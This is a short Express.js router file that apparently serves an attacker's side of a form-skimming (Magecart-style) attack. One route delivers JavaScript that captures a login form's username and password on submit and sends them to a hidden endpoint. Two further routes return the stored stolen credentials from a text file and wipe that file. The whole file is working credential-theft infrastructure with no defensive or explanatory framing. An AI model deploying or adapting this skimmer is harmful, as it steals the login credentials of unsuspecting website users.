var express = require('express');
var router = express.Router();
var fs = require('fs')

// Gets "hackers" db
router.get('/', function(req, res, next) {
    try {
        let savedData = fs.readFileSync('./users.txt', 'utf8')
        res.send(savedData)
        //file written successfully
    } catch (err) {
        res.send('Fail')
        console.error(err)
    }
});

// clears users creds
router.get('/clear', function(req, res, next) {
    try {
        const data = fs.writeFileSync('./users.txt', '')
        res.send('Success')
    } catch (e) {
        res.send('Fail')
    }
});

// script that skims the form
router.get('/mage', function(req, res, next) {
    res.type('.js');
    res.send("function start() {\n" +
        "    console.log('start')\n" +
        "    const form = document.getElementById('form1')\n" +
        "    const sendToMe = async function (event) {\n" +
        "        const username = event.currentTarget[0].value\n" +
        "        const password = event.currentTarget[1].value\n" +
        "        const response = await fetch(`/xyfjk32/g?u=${username}&p=${password}`)\n" +
        "    }\n" +
        "    form.addEventListener('submit', sendToMe);  \n" +
        "    console.log('form attached')\n" +
        "  }\n" +
        "  \n" +
        "\n" +
        "start()")
});

module.exports = router;
